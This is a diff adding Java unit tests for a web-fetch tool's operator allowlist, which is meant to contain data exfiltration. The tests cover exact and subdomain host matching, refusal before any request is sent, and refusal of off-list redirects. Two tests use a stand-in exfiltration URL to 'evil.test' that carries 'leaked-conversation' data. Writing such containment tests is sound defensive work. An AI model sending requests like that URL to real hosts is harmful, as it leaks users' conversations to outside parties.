@@ -10,6 +10,7 @@ import org.junit.jupiter.api.BeforeEach;
 import org.junit.jupiter.api.Test;
 import play.Play;
 import play.test.UnitTest;
+import services.ConfigService;
 import tools.WebFetchTool;
 
 import java.io.IOException;
@@ -47,6 +48,7 @@ class WebFetchToolTest extends UnitTest {
     }
 
     private static final String CFG_MAX_BODY_BYTES = "web_fetch.max-body-bytes";
+    private static final String CFG_ALLOWLIST = "web_fetch.allowlist";
 
     private QueueInterceptor queue;
     private OkHttpClient originalClient;
@@ -70,6 +72,7 @@ class WebFetchToolTest extends UnitTest {
     @AfterEach
     void teardown() throws Exception {
         CLIENT_FIELD.set(null, originalClient);
+        ConfigService.delete(CFG_ALLOWLIST);
         if (originalMaxBodyBytes == null) {
             Play.configuration.remove(CFG_MAX_BODY_BYTES);
         } else {
@@ -81,6 +84,11 @@ class WebFetchToolTest extends UnitTest {
      *  materialising a multi-MB body. Restored to its prior value in teardown. */
     private static void setMaxBodyBytes(long bytes) {
         Play.configuration.setProperty(CFG_MAX_BODY_BYTES, Long.toString(bytes));
+    }
+
+    /** Configure the operator outbound-host allowlist. Deleted again in teardown. */
+    private static void setAllowlist(String hosts) {
+        ConfigService.set(CFG_ALLOWLIST, hosts);
     }
 
     /** A response body with an unknown ({@code -1}) declared length, so the
@@ -488,6 +496,65 @@ class WebFetchToolTest extends UnitTest {
         assertEquals("A".repeat(50) + "B".repeat(50), result,
                 "body must be bounded to the cap before buffering; got length "
                         + result.length());
+    }
+
+    // =====================
+    // 9. JCLAW-773: operator outbound-host allowlist (exfiltration containment)
+    // =====================
+
+    @Test
+    void unsetAllowlistLeavesEveryHostReachable() {
+        queue.enqueue(ok("hello", "text/plain"));
+        var result = new WebFetchTool().execute("{\"url\":\"http://anything.test/\"}", null);
+        assertEquals("hello", result,
+                "with no allowlist configured web_fetch must stay unrestricted; got: " + result);
+    }
+
+    @Test
+    void hostOffAllowlistIsRefusedBeforeAnyRequest() {
+        setAllowlist("example.test, other.test");
+        // Nothing is enqueued, so QueueInterceptor errors if a request is attempted —
+        // the assertion passing also proves the refusal happened before the call.
+        var result = new WebFetchTool().execute(
+                "{\"url\":\"http://evil.test/collect?d=leaked-conversation\"}", null);
+        assertTrue(result.contains("not on the operator's web_fetch allowlist"),
+                "expected allowlist refusal; got: " + result);
+        assertTrue(result.contains("evil.test"),
+                "refusal must name the host so the model understands it; got: " + result);
+    }
+
+    @Test
+    void allowlistEntryDoesNotMatchBySuffixAlone() {
+        // "notexample.test" ends with "example.test" but is a different registrable
+        // host — matching must be exact or dot-delimited.
+        setAllowlist("example.test");
+        var result = new WebFetchTool().execute("{\"url\":\"http://notexample.test/\"}", null);
+        assertTrue(result.contains("not on the operator's web_fetch allowlist"),
+                "bare-suffix host must not satisfy the allowlist; got: " + result);
+    }
+
+    @Test
+    void allowlistedHostAndItsSubdomainAreFetched() {
+        setAllowlist("example.test");
+        queue.enqueue(ok("exact", "text/plain"));
+        assertEquals("exact", new WebFetchTool().execute(
+                "{\"url\":\"http://example.test/page\"}", null));
+        queue.enqueue(ok("sub", "text/plain"));
+        assertEquals("sub", new WebFetchTool().execute(
+                "{\"url\":\"http://docs.example.test/page\"}", null));
+    }
+
+    @Test
+    void redirectOffAllowlistIsRefused() {
+        // Entry host is listed; the 302 target is not. Enforcement is per hop, so
+        // an allowed host can't bounce the fetch to an unlisted one.
+        setAllowlist("example.test");
+        queue.enqueue(redirect("http://evil.test/collect?d=leaked-conversation"));
+        var result = new WebFetchTool().execute("{\"url\":\"http://example.test/\"}", null);
+        assertTrue(result.contains("not on the operator's web_fetch allowlist"),
+                "redirect hop off the allowlist must be refused; got: " + result);
+        assertTrue(result.contains("evil.test"),
+                "refusal must name the redirect target; got: " + result);
     }
 
     /** Build a one-page PDF containing {@code text}, using the PDFBox 3.x that
